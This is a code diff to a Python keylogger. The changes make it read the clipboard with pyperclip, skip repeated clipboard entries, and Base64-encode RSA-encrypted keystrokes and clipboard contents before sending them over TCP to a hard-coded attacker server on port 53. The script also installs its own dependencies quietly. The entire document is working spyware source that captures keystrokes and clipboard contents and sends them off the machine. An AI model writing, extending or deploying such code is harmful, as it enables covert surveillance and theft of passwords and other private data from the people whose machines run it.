@@ -1,6 +1,8 @@
 #!/usr/bin/python3
 
 # _*_ coding: utf-8 _*_
+
+
 #tested on Linux (Linux kali 6.5.0-kali2-amd64)
 
 # to do:
@@ -14,13 +16,18 @@
 try:
     from os import system
     import threading, socket
-    from pynput import keyboard
-    from pandas import read_clipboard
+    from pynput import keyboard  #type: ignore
+
+    # for getting the clipboard data (supports cross platform)
+    from pyperclip import paste  
+
+    # encryption and encoding
     import rsa
+    from base64 import b64encode
 except:
     #two dependencies pynput and pandas ['-q' for quite mode]
     system('pip install -q pynput')
-    system('pip install -q pandas')
+    system('pip install -q pyperclip')
     system('pip install -q rsa')
 
 # <-- Initializing global values -->
@@ -28,6 +35,8 @@ except:
 # replace the IP with your server's IP 
 # LAN (it establishes a TCP connection for sending data)
 SERVER_ADDRESS = ("192.168.29.54", "53")
+
+duplicate = ['']  # for sending unique clipboard data
 
 
 #keystroke record
@@ -44,18 +53,25 @@ class keylogger:
         self.publickey = rsa.PublicKey.load_pkcs1(self.serialized_publickey)
     
 
+    def clipboarddata(self,data):
+        try:
+            self.server.send(b64encode(rsa.encrypt(f'Clipboard data: {data}'.encode(), self.publickey)))
+        except:
+            pass
+
+
     def Keylogging(self):
         def on_key_press(key):
             try:
-                # clipboard data processing:
-                data = str(read_clipboard().columns)
-                data = data.lstrip('Index([')
-                data = data.split("], dtype='object'")
-                data = data[0]
+                # to get the clipboard data
+                data = paste()
 
-                # sending the encrypted data to the server
-                self.server.send(rsa.encrypt((f'Clipboard data: {data}').encode(), self.publickey))
-                self.server.send(rsa.encrypt((str(f'{key}')).encode(), self.publickey))
+                if data != duplicate[0]:
+                    self.clipboarddata(data)
+                    duplicate[0] = data
+
+                # sending the Base64 encoded RSA encrypted data to the server
+                self.server.send(b64encode(rsa.encrypt(str(key).encode(), self.publickey)))
 
             except:
                 pass
